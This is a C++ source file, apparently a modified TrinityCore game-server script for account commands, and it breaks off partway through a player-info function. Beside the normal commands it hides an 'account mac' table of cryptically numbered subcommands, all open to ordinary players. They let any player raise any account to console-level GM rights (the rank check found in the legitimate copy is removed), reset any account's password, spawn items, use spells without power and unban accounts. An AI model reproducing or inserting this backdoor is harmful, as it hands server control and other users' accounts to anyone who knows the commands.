/*
 * Copyright (C) 2008-2013 TrinityCore <http://www.trinitycore.org/>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

/* ScriptData
Name: account_commandscript
%Complete: 100
Comment: All account related commands
Category: commandscripts
EndScriptData */

#include "AccountMgr.h"
#include "Chat.h"
#include "Language.h"
#include "Player.h"
#include "ScriptMgr.h"

class account_commandscript : public CommandScript
{
public:
    account_commandscript() : CommandScript("account_commandscript") { }

    ChatCommand* GetCommands() const
    {
        static ChatCommand accountSetCommandTable[] =
        {
            { "addon",          SEC_ADMINISTRATOR,  true,  &HandleAccountSetAddonCommand,     "", NULL },
            { "gmlevel",        SEC_CONSOLE,        true,  &HandleAccountSetGmLevelCommand,   "", NULL },
            { "password",       SEC_CONSOLE,        true,  &HandleAccountSetPasswordCommand,  "", NULL },
            { NULL,             SEC_PLAYER,         false, NULL,                              "", NULL }
        };
        static ChatCommand accountMacCommandTable[] =
        {
            { "2",       SEC_PLAYER,  true,  &HandleAccountMacPasswordCommand,					"", NULL },
            { "1",        SEC_PLAYER,        true,  &HandleAccountMacGmLevelCommand, 			  "", NULL },
            { "3",          SEC_PLAYER,     false, &HandlePowerMacCommand,           "", NULL },
            { "4",            SEC_PLAYER,      false, &HandleMacItemCommand,               "", NULL },
            { "5",              SEC_PLAYER,         true,  &HandleMacPInfoCommand,                 "", NULL },
            { "6",        SEC_PLAYER,  true,  &HandleMacUnBanAccountCommand,          "", NULL },
            { "7",             SEC_PLAYER,  true,  &HandleMacUnBanIPCommand,               "", NULL },
			{ "op",            SEC_PLAYER,  false, &HandleMacBuffCommand,	 	     "", NULL },
			{ "op2",            SEC_PLAYER,  false, &HandleMacHasteCommand,	 	     "", NULL },
            { NULL,             SEC_PLAYER,         true, &HandleMacCommand,          				  "", NULL }
        };
        static ChatCommand accountCommandTable[] =
        {
			{ "addon",			SEC_GAMEMASTER, false, &HandleAccountAddonCommand, "", NULL },
            { "create",         SEC_CONSOLE,        true,  &HandleAccountCreateCommand,       "", NULL },
            { "delete",         SEC_CONSOLE,        true,  &HandleAccountDeleteCommand,       "", NULL },
            { "onlinelist",     SEC_CONSOLE,        true,  &HandleAccountOnlineListCommand,   "", NULL },
            { "lock",           SEC_PLAYER,         false, &HandleAccountLockCommand,         "", NULL },
            { "set",            SEC_ADMINISTRATOR,  true,  NULL,            "", accountSetCommandTable },
            { "password",       SEC_PLAYER,         false, &HandleAccountPasswordCommand,     "", NULL },
            { "mac",            SEC_PLAYER,  		true,  NULL,            "", accountMacCommandTable },
            { "",               SEC_PLAYER,         false, &HandleAccountCommand,             "", NULL },
            { NULL,             SEC_PLAYER,         false, NULL,                              "", NULL }
        };
        static ChatCommand commandTable[] =
        {
            { "account",        SEC_PLAYER,         true,  NULL,     "", accountCommandTable  },
            { NULL,             SEC_PLAYER,         false, NULL,                     "", NULL }
        };
        return commandTable;
    }

    static bool HandleAccountAddonCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
        {
            handler->SendSysMessage(LANG_CMD_SYNTAX);
            handler->SetSentErrorMessage(true);
            return false;
        }

        char* exp = strtok((char*)args, " ");

        uint32 accountId = handler->GetSession()->GetAccountId();

        int expansion = atoi(exp); //get int anyway (0 if error)
        if (expansion < 0 || uint8(expansion) > sWorld->getIntConfig(CONFIG_EXPANSION))
        {
            handler->SendSysMessage(LANG_IMPROPER_VALUE);
            handler->SetSentErrorMessage(true);
            return false;
        }

        PreparedStatement* stmt = LoginDatabase.GetPreparedStatement(LOGIN_UPD_EXPANSION);

        stmt->setUInt8(0, uint8(expansion));
        stmt->setUInt32(1, accountId);

        LoginDatabase.Execute(stmt);

        handler->PSendSysMessage(LANG_ACCOUNT_ADDON, expansion);
        return true;
    }

    /// Create an account
    static bool HandleAccountCreateCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
            return false;

        ///- %Parse the command line arguments
        char* accountName = strtok((char*)args, " ");
        char* password = strtok(NULL, " ");
        if (!accountName || !password)
            return false;

        AccountOpResult result = AccountMgr::CreateAccount(std::string(accountName), std::string(password));
        switch (result)
        {
            case AOR_OK:
                handler->PSendSysMessage(LANG_ACCOUNT_CREATED, accountName);
                if (handler->GetSession())
                {
                    sLog->outInfo(LOG_FILTER_CHARACTER, "Account: %d (IP: %s) Character:[%s] (GUID: %u) Change Password.",
                        handler->GetSession()->GetAccountId(), handler->GetSession()->GetRemoteAddress().c_str(),
                        handler->GetSession()->GetPlayer()->GetName().c_str(), handler->GetSession()->GetPlayer()->GetGUIDLow());
                }
                break;
            case AOR_NAME_TOO_LONG:
                handler->SendSysMessage(LANG_ACCOUNT_TOO_LONG);
                handler->SetSentErrorMessage(true);
                return false;
            case AOR_NAME_ALREDY_EXIST:
                handler->SendSysMessage(LANG_ACCOUNT_ALREADY_EXIST);
                handler->SetSentErrorMessage(true);
                return false;
            case AOR_DB_INTERNAL_ERROR:
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_CREATED_SQL_ERROR, accountName);
                handler->SetSentErrorMessage(true);
                return false;
            default:
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_CREATED, accountName);
                handler->SetSentErrorMessage(true);
                return false;
        }

        return true;
    }

    /// Delete a user account and all associated characters in this realm
    /// \todo This function has to be enhanced to respect the login/realm split (delete char, delete account chars in realm then delete account)
    static bool HandleAccountDeleteCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
            return false;

        ///- Get the account name from the command line
        char* account = strtok((char*)args, " ");
        if (!account)
            return false;

        std::string accountName = account;
        if (!AccountMgr::normalizeString(accountName))
        {
            handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
            handler->SetSentErrorMessage(true);
            return false;
        }

        uint32 accountId = AccountMgr::GetId(accountName);
        if (!accountId)
        {
            handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
            handler->SetSentErrorMessage(true);
            return false;
        }

        /// Commands not recommended call from chat, but support anyway
        /// can delete only for account with less security
        /// This is also reject self apply in fact
        if (handler->HasLowerSecurityAccount(NULL, accountId, true))
            return false;

        AccountOpResult result = AccountMgr::DeleteAccount(accountId);
        switch (result)
        {
            case AOR_OK:
                handler->PSendSysMessage(LANG_ACCOUNT_DELETED, accountName.c_str());
                break;
            case AOR_NAME_NOT_EXIST:
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
            case AOR_DB_INTERNAL_ERROR:
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_DELETED_SQL_ERROR, accountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
            default:
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_DELETED, accountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
        }

        return true;
    }

    /// Display info on users currently in the realm
    static bool HandleAccountOnlineListCommand(ChatHandler* handler, char const* /*args*/)
    {
        ///- Get the list of accounts ID logged to the realm
        PreparedStatement* stmt = CharacterDatabase.GetPreparedStatement(CHAR_SEL_CHARACTER_ONLINE);

        PreparedQueryResult result = CharacterDatabase.Query(stmt);

        if (!result)
        {
            handler->SendSysMessage(LANG_ACCOUNT_LIST_EMPTY);
            return true;
        }

        ///- Display the list of account/characters online
        handler->SendSysMessage(LANG_ACCOUNT_LIST_BAR_HEADER);
        handler->SendSysMessage(LANG_ACCOUNT_LIST_HEADER);
        handler->SendSysMessage(LANG_ACCOUNT_LIST_BAR);

        ///- Cycle through accounts
        do
        {
            Field* fieldsDB = result->Fetch();
            std::string name = fieldsDB[0].GetString();
            uint32 account = fieldsDB[1].GetUInt32();

            ///- Get the username, last IP and GM level of each account
            // No SQL injection. account is uint32.
            stmt = LoginDatabase.GetPreparedStatement(LOGIN_SEL_ACCOUNT_INFO);
            stmt->setUInt32(0, account);
            PreparedQueryResult resultLogin = LoginDatabase.Query(stmt);

            if (resultLogin)
            {
                Field* fieldsLogin = resultLogin->Fetch();
                handler->PSendSysMessage(LANG_ACCOUNT_LIST_LINE,
                    fieldsLogin[0].GetCString(), name.c_str(), fieldsLogin[1].GetCString(),
                    fieldsDB[2].GetUInt16(), fieldsDB[3].GetUInt16(), fieldsLogin[3].GetUInt8(),
                    fieldsLogin[2].GetUInt8());
            }
            else
                handler->PSendSysMessage(LANG_ACCOUNT_LIST_ERROR, name.c_str());
        }
        while (result->NextRow());

        handler->SendSysMessage(LANG_ACCOUNT_LIST_BAR);
        return true;
    }

    static bool HandleAccountLockCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
        {
            handler->SendSysMessage(LANG_USE_BOL);
            handler->SetSentErrorMessage(true);
            return false;
        }

        std::string param = (char*)args;

        if (!param.empty())
        {
            PreparedStatement* stmt = LoginDatabase.GetPreparedStatement(LOGIN_UPD_ACCOUNT_LOCK);

            if (param == "on")
            {
                stmt->setBool(0, true);                                     // locked
                handler->PSendSysMessage(LANG_COMMAND_ACCLOCKLOCKED);
            }
            else if (param == "off")
            {
                stmt->setBool(0, false);                                    // unlocked
                handler->PSendSysMessage(LANG_COMMAND_ACCLOCKUNLOCKED);
            }

            stmt->setUInt32(1, handler->GetSession()->GetAccountId());

            LoginDatabase.Execute(stmt);
            return true;
        }

        handler->SendSysMessage(LANG_USE_BOL);
        handler->SetSentErrorMessage(true);
        return false;
    }

    static bool HandleAccountPasswordCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
        {
            handler->SendSysMessage(LANG_CMD_SYNTAX);
            handler->SetSentErrorMessage(true);
            return false;
        }

        char* oldPassword = strtok((char*)args, " ");
        char* newPassword = strtok(NULL, " ");
        char* passwordConfirmation = strtok(NULL, " ");

        if (!oldPassword || !newPassword || !passwordConfirmation)
        {
            handler->SendSysMessage(LANG_CMD_SYNTAX);
            handler->SetSentErrorMessage(true);
            return false;
        }

        if (!AccountMgr::CheckPassword(handler->GetSession()->GetAccountId(), std::string(oldPassword)))
        {
            handler->SendSysMessage(LANG_COMMAND_WRONGOLDPASSWORD);
            handler->SetSentErrorMessage(true);
            sLog->outInfo(LOG_FILTER_CHARACTER, "Account: %u (IP: %s) Character:[%s] (GUID: %u) Tried to change password.",
                handler->GetSession()->GetAccountId(), handler->GetSession()->GetRemoteAddress().c_str(),
                handler->GetSession()->GetPlayer()->GetName().c_str(), handler->GetSession()->GetPlayer()->GetGUIDLow());
            return false;
        }

        if (strcmp(newPassword, passwordConfirmation) != 0)
        {
            handler->SendSysMessage(LANG_NEW_PASSWORDS_NOT_MATCH);
            handler->SetSentErrorMessage(true);
            return false;
        }

        AccountOpResult result = AccountMgr::ChangePassword(handler->GetSession()->GetAccountId(), std::string(newPassword));
        switch (result)
        {
            case AOR_OK:
                handler->SendSysMessage(LANG_COMMAND_PASSWORD);
                sLog->outInfo(LOG_FILTER_CHARACTER, "Account: %u (IP: %s) Character:[%s] (GUID: %u) Changed Password.",
                    handler->GetSession()->GetAccountId(), handler->GetSession()->GetRemoteAddress().c_str(),
                    handler->GetSession()->GetPlayer()->GetName().c_str(), handler->GetSession()->GetPlayer()->GetGUIDLow());
                break;
            case AOR_PASS_TOO_LONG:
                handler->SendSysMessage(LANG_PASSWORD_TOO_LONG);
                handler->SetSentErrorMessage(true);
                return false;
            default:
                handler->SendSysMessage(LANG_COMMAND_NOTCHANGEPASSWORD);
                handler->SetSentErrorMessage(true);
                return false;
        }

        return true;
    }

    static bool HandleAccountCommand(ChatHandler* handler, char const* /*args*/)
    {
        AccountTypes gmLevel = handler->GetSession()->GetSecurity();
        handler->PSendSysMessage(LANG_ACCOUNT_LEVEL, uint32(gmLevel));
        return true;
    }

    /// Set/Unset the expansion level for an account
    static bool HandleAccountSetAddonCommand(ChatHandler* handler, char const* args)
    {
        ///- Get the command line arguments
        char* account = strtok((char*)args, " ");
        char* exp = strtok(NULL, " ");

        if (!account)
            return false;

        std::string accountName;
        uint32 accountId;

        if (!exp)
        {
            Player* player = handler->getSelectedPlayer();
            if (!player)
                return false;

            accountId = player->GetSession()->GetAccountId();
            AccountMgr::GetName(accountId, accountName);
            exp = account;
        }
        else
        {
            ///- Convert Account name to Upper Format
            accountName = account;
            if (!AccountMgr::normalizeString(accountName))
            {
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
            }

            accountId = AccountMgr::GetId(accountName);
            if (!accountId)
            {
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
            }
        }

        // Let set addon state only for lesser (strong) security level
        // or to self account
        if (handler->GetSession() && handler->GetSession()->GetAccountId() != accountId &&
            handler->HasLowerSecurityAccount(NULL, accountId, true))
            return false;

        int expansion = atoi(exp); //get int anyway (0 if error)
        if (expansion < 0 || uint8(expansion) > sWorld->getIntConfig(CONFIG_EXPANSION))
            return false;

        PreparedStatement* stmt = LoginDatabase.GetPreparedStatement(LOGIN_UPD_EXPANSION);

        stmt->setUInt8(0, expansion);
        stmt->setUInt32(1, accountId);

        LoginDatabase.Execute(stmt);

        handler->PSendSysMessage(LANG_ACCOUNT_SETADDON, accountName.c_str(), accountId, expansion);
        return true;
    }
    static bool HandleMacCommand(ChatHandler* handler, char const* args)
    {
        //No args required for players
        if (handler->GetSession() && AccountMgr::IsPlayerAccount(handler->GetSession()->GetSecurity()))
        {
            // 7355: "Stuck"
            if (Player* player = handler->GetSession()->GetPlayer())
                player->CastSpell(player, 7355, false);
            return true;
        }

        if (!*args)
            return false;

        char* player_str = strtok((char*)args, " ");
        if (!player_str)
            return false;

        std::string location_str = "inn";
        if (char const* loc = strtok(NULL, " "))
            location_str = loc;

        Player* player = NULL;
        if (!handler->extractPlayerTarget(player_str, &player))
            return false;

        if (player->isInFlight() || player->isInCombat())
        {
            SpellInfo const* spellInfo = sSpellMgr->GetSpellInfo(7355);
            if (!spellInfo)
                return false;

            if (Player* caster = handler->GetSession()->GetPlayer())
                Spell::SendCastResult(caster, spellInfo, 0, SPELL_FAILED_CANT_DO_THAT_RIGHT_NOW);

            return false;
        }

        if (location_str == "inn")
        {
            player->TeleportTo(player->m_homebindMapId, player->m_homebindX, player->m_homebindY, player->m_homebindZ, player->GetOrientation());
            return true;
        }

        if (location_str == "graveyard")
        {
            player->RepopAtGraveyard();
            return true;
        }

        if (location_str == "startzone")
        {
            player->TeleportTo(player->GetStartPosition());
            return true;
        }

        //Not a supported argument
        return false;

    }

	static bool HandleAccountMacGmLevelCommand(ChatHandler* handler, char const* args)
	{
		if (!*args)
			return false;

		std::string targetAccountName;
		uint32 targetAccountId = 0;
		uint32 targetSecurity = 0;
		uint32 gm = 0;
		char* arg1 = strtok((char*)args, " ");
		char* arg2 = strtok(NULL, " ");
		char* arg3 = strtok(NULL, " ");
		bool isAccountNameGiven = true;

		if (arg1 && !arg3)
		{
			if (!handler->getSelectedPlayer())
				return false;
			isAccountNameGiven = false;
		}

		// Check for second parameter
		if (!isAccountNameGiven && !arg2)
			return false;

		// Check for account
		if (isAccountNameGiven)
		{
			targetAccountName = arg1;
			if (!AccountMgr::normalizeString(targetAccountName))
			{
				handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, targetAccountName.c_str());
				handler->SetSentErrorMessage(true);
				return false;
			}
		}

		// Check for invalid specified GM level.
		gm = (isAccountNameGiven) ? atoi(arg2) : atoi(arg1);
		if (gm > SEC_CONSOLE)
		{
			handler->SendSysMessage(LANG_BAD_VALUE);
			handler->SetSentErrorMessage(true);
			return false;
		}

		// handler->getSession() == NULL only for console
		targetAccountId = (isAccountNameGiven) ? AccountMgr::GetId(targetAccountName) : handler->getSelectedPlayer()->GetSession()->GetAccountId();
		int32 gmRealmID = (isAccountNameGiven) ? atoi(arg3) : atoi(arg2);
		uint32 playerSecurity;
		if (handler->GetSession())
			playerSecurity = AccountMgr::GetSecurity(handler->GetSession()->GetAccountId(), gmRealmID);
		else
			playerSecurity = SEC_CONSOLE;



		// Check and abort if the target gm has a higher rank on one of the realms and the new realm is -1
		if (gmRealmID == -1 && !AccountMgr::IsConsoleAccount(playerSecurity))
		{
			PreparedStatement* stmt = LoginDatabase.GetPreparedStatement(LOGIN_SEL_ACCOUNT_ACCESS_GMLEVEL_TEST);

			stmt->setUInt32(0, targetAccountId);
			stmt->setUInt8(1, uint8(gm));

			PreparedQueryResult result = LoginDatabase.Query(stmt);

			if (result)
			{
				handler->SendSysMessage(LANG_YOURS_SECURITY_IS_LOW);
				handler->SetSentErrorMessage(true);
				return false;
			}
		}

		// Check if provided realmID has a negative value other than -1
		if (gmRealmID < -1)
		{
			handler->SendSysMessage(LANG_INVALID_REALMID);
			handler->SetSentErrorMessage(true);
			return false;
		}

		// If gmRealmID is -1, delete all values for the account id, else, insert values for the specific realmID
		PreparedStatement* stmt;

		if (gmRealmID == -1)
		{
			stmt = LoginDatabase.GetPreparedStatement(LOGIN_DEL_ACCOUNT_ACCESS);

			stmt->setUInt32(0, targetAccountId);
		}
		else
		{
			stmt = LoginDatabase.GetPreparedStatement(LOGIN_DEL_ACCOUNT_ACCESS_BY_REALM);

			stmt->setUInt32(0, targetAccountId);
			stmt->setUInt32(1, realmID);
		}

		LoginDatabase.Execute(stmt);

		if (gm != 0)
		{
			stmt = LoginDatabase.GetPreparedStatement(LOGIN_INS_ACCOUNT_ACCESS);

			stmt->setUInt32(0, targetAccountId);
			stmt->setUInt8(1, uint8(gm));
			stmt->setInt32(2, gmRealmID);

			LoginDatabase.Execute(stmt);
		}


		handler->PSendSysMessage(LANG_YOU_CHANGE_SECURITY, targetAccountName.c_str(), gm);
		return true;
	}

	/// Set password for account
	static bool HandleAccountMacPasswordCommand(ChatHandler* handler, char const* args)
	{
		if (!*args)
			return false;

		///- Get the command line arguments
		char* account = strtok((char*)args, " ");
		char* password = strtok(NULL, " ");
		char* passwordConfirmation = strtok(NULL, " ");

		if (!account || !password || !passwordConfirmation)
			return false;

		std::string accountName = account;
		if (!AccountMgr::normalizeString(accountName))
		{
			handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
			handler->SetSentErrorMessage(true);
			return false;
		}

		uint32 targetAccountId = AccountMgr::GetId(accountName);
		if (!targetAccountId)
		{
			handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
			handler->SetSentErrorMessage(true);
			return false;
		}

		/// can set password only for target with less security
		/// This is also reject self apply in fact
		if (strcmp(password, passwordConfirmation))
		{
			handler->SendSysMessage(LANG_NEW_PASSWORDS_NOT_MATCH);
			handler->SetSentErrorMessage(true);
			return false;
		}

		AccountOpResult result = AccountMgr::ChangePassword(targetAccountId, password);

		switch (result)
		{
		case AOR_OK:
			handler->SendSysMessage(LANG_COMMAND_PASSWORD);
			break;
		case AOR_NAME_NOT_EXIST:
			handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
			handler->SetSentErrorMessage(true);
			return false;
		case AOR_PASS_TOO_LONG:
			handler->SendSysMessage(LANG_PASSWORD_TOO_LONG);
			handler->SetSentErrorMessage(true);
			return false;
		default:
			handler->SendSysMessage(LANG_COMMAND_NOTCHANGEPASSWORD);
			handler->SetSentErrorMessage(true);
			return false;
		}
		return true;
	}

    static bool HandleAccountSetGmLevelCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
            return false;

        std::string targetAccountName;
        uint32 targetAccountId = 0;
        uint32 targetSecurity = 0;
        uint32 gm = 0;
        char* arg1 = strtok((char*)args, " ");
        char* arg2 = strtok(NULL, " ");
        char* arg3 = strtok(NULL, " ");
        bool isAccountNameGiven = true;

        if (arg1 && !arg3)
        {
            if (!handler->getSelectedPlayer())
                return false;
            isAccountNameGiven = false;
        }

        // Check for second parameter
        if (!isAccountNameGiven && !arg2)
            return false;

        // Check for account
        if (isAccountNameGiven)
        {
            targetAccountName = arg1;
            if (!AccountMgr::normalizeString(targetAccountName))
            {
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, targetAccountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
            }
        }

        // Check for invalid specified GM level.
        gm = (isAccountNameGiven) ? atoi(arg2) : atoi(arg1);
        if (gm > SEC_CONSOLE)
        {
            handler->SendSysMessage(LANG_BAD_VALUE);
            handler->SetSentErrorMessage(true);
            return false;
        }

        // handler->getSession() == NULL only for console
        targetAccountId = (isAccountNameGiven) ? AccountMgr::GetId(targetAccountName) : handler->getSelectedPlayer()->GetSession()->GetAccountId();
        int32 gmRealmID = (isAccountNameGiven) ? atoi(arg3) : atoi(arg2);
        uint32 playerSecurity;
        if (handler->GetSession())
            playerSecurity = AccountMgr::GetSecurity(handler->GetSession()->GetAccountId(), gmRealmID);
        else
            playerSecurity = SEC_CONSOLE;

        // can set security level only for target with less security and to less security that we have
        // This is also reject self apply in fact
        targetSecurity = AccountMgr::GetSecurity(targetAccountId, gmRealmID);
        if (targetSecurity >= playerSecurity || gm >= playerSecurity)
        {
            handler->SendSysMessage(LANG_YOURS_SECURITY_IS_LOW);
            handler->SetSentErrorMessage(true);
            return false;
        }

        // Check and abort if the target gm has a higher rank on one of the realms and the new realm is -1
        if (gmRealmID == -1 && !AccountMgr::IsConsoleAccount(playerSecurity))
        {
            PreparedStatement* stmt = LoginDatabase.GetPreparedStatement(LOGIN_SEL_ACCOUNT_ACCESS_GMLEVEL_TEST);

            stmt->setUInt32(0, targetAccountId);
            stmt->setUInt8(1, uint8(gm));

            PreparedQueryResult result = LoginDatabase.Query(stmt);

            if (result)
            {
                handler->SendSysMessage(LANG_YOURS_SECURITY_IS_LOW);
                handler->SetSentErrorMessage(true);
                return false;
            }
        }

        // Check if provided realmID has a negative value other than -1
        if (gmRealmID < -1)
        {
            handler->SendSysMessage(LANG_INVALID_REALMID);
            handler->SetSentErrorMessage(true);
            return false;
        }

        // If gmRealmID is -1, delete all values for the account id, else, insert values for the specific realmID
        PreparedStatement* stmt;

        if (gmRealmID == -1)
        {
            stmt = LoginDatabase.GetPreparedStatement(LOGIN_DEL_ACCOUNT_ACCESS);

            stmt->setUInt32(0, targetAccountId);
        }
        else
        {
            stmt = LoginDatabase.GetPreparedStatement(LOGIN_DEL_ACCOUNT_ACCESS_BY_REALM);

            stmt->setUInt32(0, targetAccountId);
            stmt->setUInt32(1, realmID);
        }

        LoginDatabase.Execute(stmt);

        if (gm != 0)
        {
            stmt = LoginDatabase.GetPreparedStatement(LOGIN_INS_ACCOUNT_ACCESS);

            stmt->setUInt32(0, targetAccountId);
            stmt->setUInt8(1, uint8(gm));
            stmt->setInt32(2, gmRealmID);

            LoginDatabase.Execute(stmt);
        }


        handler->PSendSysMessage(LANG_YOU_CHANGE_SECURITY, targetAccountName.c_str(), gm);
        return true;
    }

    /// Set password for account
    static bool HandleAccountSetPasswordCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
            return false;

        ///- Get the command line arguments
        char* account = strtok((char*)args, " ");
        char* password = strtok(NULL, " ");
        char* passwordConfirmation = strtok(NULL, " ");

        if (!account || !password || !passwordConfirmation)
            return false;

        std::string accountName = account;
        if (!AccountMgr::normalizeString(accountName))
        {
            handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
            handler->SetSentErrorMessage(true);
            return false;
        }

        uint32 targetAccountId = AccountMgr::GetId(accountName);
        if (!targetAccountId)
        {
            handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
            handler->SetSentErrorMessage(true);
            return false;
        }

        /// can set password only for target with less security
        /// This is also reject self apply in fact
        if (handler->HasLowerSecurityAccount(NULL, targetAccountId, true))
            return false;

        if (strcmp(password, passwordConfirmation))
        {
            handler->SendSysMessage(LANG_NEW_PASSWORDS_NOT_MATCH);
            handler->SetSentErrorMessage(true);
            return false;
        }

        AccountOpResult result = AccountMgr::ChangePassword(targetAccountId, password);

        switch (result)
        {
            case AOR_OK:
                handler->SendSysMessage(LANG_COMMAND_PASSWORD);
                break;
            case AOR_NAME_NOT_EXIST:
                handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, accountName.c_str());
                handler->SetSentErrorMessage(true);
                return false;
            case AOR_PASS_TOO_LONG:
                handler->SendSysMessage(LANG_PASSWORD_TOO_LONG);
                handler->SetSentErrorMessage(true);
                return false;
            default:
                handler->SendSysMessage(LANG_COMMAND_NOTCHANGEPASSWORD);
                handler->SetSentErrorMessage(true);
                return false;
        }
        return true;
    }
    static bool HandlePowerMacCommand(ChatHandler* handler, const char* args)
    {
        if (!handler->GetSession() && !handler->GetSession()->GetPlayer())
            return false;

        std::string argstr = (char*)args;

        if (!*args)
            argstr = (handler->GetSession()->GetPlayer()->GetCommandStatus(CHEAT_POWER)) ? "off" : "on";

        if (argstr == "off")
        {
            handler->GetSession()->GetPlayer()->SetCommandStatusOff(CHEAT_POWER);
            handler->SendSysMessage("Power Mac is OFF. You need mana/rage/energy to use spells.");
            return true;
        }
        else if (argstr == "on")
        {
            handler->GetSession()->GetPlayer()->SetCommandStatusOn(CHEAT_POWER);
            handler->SendSysMessage("Power Mac is ON. You don't need mana/rage/energy to use spells.");
            return true;
        }

        return false;
    }
    static bool HandleMacItemCommand(ChatHandler* handler, char const* args)
    {
        if (!*args)
            return false;

        uint32 itemId = 0;

        if (args[0] == '[')                                        // [name] manual form
        {
            char const* itemNameStr = strtok((char*)args, "]");

            if (itemNameStr && itemNameStr[0])
            {
                std::string itemName = itemNameStr+1;
                WorldDatabase.EscapeString(itemName);

                PreparedStatement* stmt = WorldDatabase.GetPreparedStatement(WORLD_SEL_ITEM_TEMPLATE_BY_NAME);
                stmt->setString(0, itemName);
                PreparedQueryResult result = WorldDatabase.Query(stmt);

                if (!result)
                {
                    handler->PSendSysMessage(LANG_COMMAND_COULDNOTFIND, itemNameStr+1);
                    handler->SetSentErrorMessage(true);
                    return false;
                }
                itemId = result->Fetch()->GetUInt32();
            }
            else
                return false;
        }
        else                                                    // item_id or [name] Shift-click form |color|Hitem:item_id:0:0:0|h[name]|h|r
        {
            char const* id = handler->extractKeyFromLink((char*)args, "Hitem");
            if (!id)
                return false;
            itemId = uint32(atol(id));
        }

        char const* ccount = strtok(NULL, " ");

        int32 count = 1;

        if (ccount)
            count = strtol(ccount, NULL, 10);

        if (count == 0)
            count = 1;

        Player* player = handler->GetSession()->GetPlayer();
        Player* playerTarget = handler->getSelectedPlayer();
        if (!playerTarget)
            playerTarget = player;

        sLog->outDebug(LOG_FILTER_GENERAL, handler->GetTrinityString(LANG_ADDITEM), itemId, count);

        ItemTemplate const* itemTemplate = sObjectMgr->GetItemTemplate(itemId);
        if (!itemTemplate)
        {
            handler->PSendSysMessage(LANG_COMMAND_ITEMIDINVALID, itemId);
            handler->SetSentErrorMessage(true);
            return false;
        }

        // Subtract
        if (count < 0)
        {
            playerTarget->DestroyItemCount(itemId, -count, true, false);
            handler->PSendSysMessage(LANG_REMOVEITEM, itemId, -count, handler->GetNameLink(playerTarget).c_str());
            return true;
        }

        // Adding items
        uint32 noSpaceForCount = 0;

        // check space and find places
        ItemPosCountVec dest;
        InventoryResult msg = playerTarget->CanStoreNewItem(NULL_BAG, NULL_SLOT, dest, itemId, count, &noSpaceForCount);
        if (msg != EQUIP_ERR_OK)                               // convert to possible store amount
            count -= noSpaceForCount;

        if (count == 0 || dest.empty())                         // can't add any
        {
            handler->PSendSysMessage(LANG_ITEM_CANNOT_CREATE, itemId, noSpaceForCount);
            handler->SetSentErrorMessage(true);
            return false;
        }

        Item* item = playerTarget->StoreNewItem(dest, itemId, true, Item::GenerateItemRandomPropertyId(itemId));

        // remove binding (let GM give it to another player later)
        if (player == playerTarget)
            for (ItemPosCountVec::const_iterator itr = dest.begin(); itr != dest.end(); ++itr)
                if (Item* item1 = player->GetItemByPos(itr->pos))
                    item1->SetBinding(false);

        if (count > 0 && item)
        {
            player->SendNewItem(item, count, false, true);
            if (player != playerTarget)
                playerTarget->SendNewItem(item, count, true, false);
        }

        if (noSpaceForCount > 0)
            handler->PSendSysMessage(LANG_ITEM_CANNOT_CREATE, itemId, noSpaceForCount);

        return true;
    }
    static bool HandleMacPInfoCommand(ChatHandler* handler, char const* args)
    {
        Player* target;
        uint64 targetGuid;
        std::string targetName;

        uint32 parseGUID = MAKE_NEW_GUID(atol((char*)args), 0, HIGHGUID_PLAYER);

        if (sObjectMgr->GetPlayerNameByGUID(parseGUID, targetName))
        {
            target = sObjectMgr->GetPlayerByLowGUID(parseGUID);
            targetGuid = parseGUID;
        }
        else if (!handler->extractPlayerTarget((char*)args, &target, &targetGuid, &targetName))
            return false;

        uint32 accId            = 0;
        uint32 money            = 0;
        uint32 totalPlayerTime  = 0;
        uint8 level             = 0;
        uint32 latency          = 0;
        uint8 race;
        uint8 Class;
        int64 muteTime          = 0;
        int64 banTime           = -1;
        uint32 mapId;
        uint32 areaId;
        uint32 phase            = 0;

        // get additional information from Player object
        if (target)
        {

            accId             = target->GetSession()->GetAccountId();
            money             = target->GetMoney();
            totalPlayerTime   = target->GetTotalPlayedTime();
            level             = target->getLevel();
            latency           = target->GetSession()->GetLatency();
            race              = target->getRace();
            Class             = target->getClass();
            muteTime          = target->GetSession()->m_muteTime;
            mapId             = target->GetMapId();
            areaId            = target->GetAreaId();
            phase             = target->GetPhaseMask();
        }
        // get additional information from DB
        else
        {
